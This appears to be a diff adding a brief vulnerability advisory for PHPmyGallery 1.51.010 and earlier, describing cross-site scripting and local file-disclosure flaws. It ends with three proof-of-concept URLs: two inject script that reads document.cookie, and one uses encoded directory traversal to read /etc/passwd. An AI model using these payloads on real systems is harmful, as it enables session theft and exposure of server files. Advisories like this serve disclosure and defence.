@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/58081/info
+
+PHPmyGallery is prone to multiple cross-site scripting vulnerabilities and a local file-disclosure vulnerability because it fails to sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, and obtain sensitive information from local files on computers running the vulnerable application. This may aid in further attacks
+
+PHPmyGallery 1.51.010 and prior versions are vulnerable. 
+
+http://www.www.example.com/_conf/?action=statistics&filename=2011.10"><script>alert(document.cookie)</script>><marquee><h1>TheMirkin</h1></marquee>
+
+http://www.www.example.com/_conf/?action=delsettings&group="><script>alert(document.cookie)</script>><marquee><h1>TheMirkin</h1></marquee>
+
+http://www.example.com/_conf/?action=delsettings&group=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg&picdir=Sample_Gallery&what=descriptions 
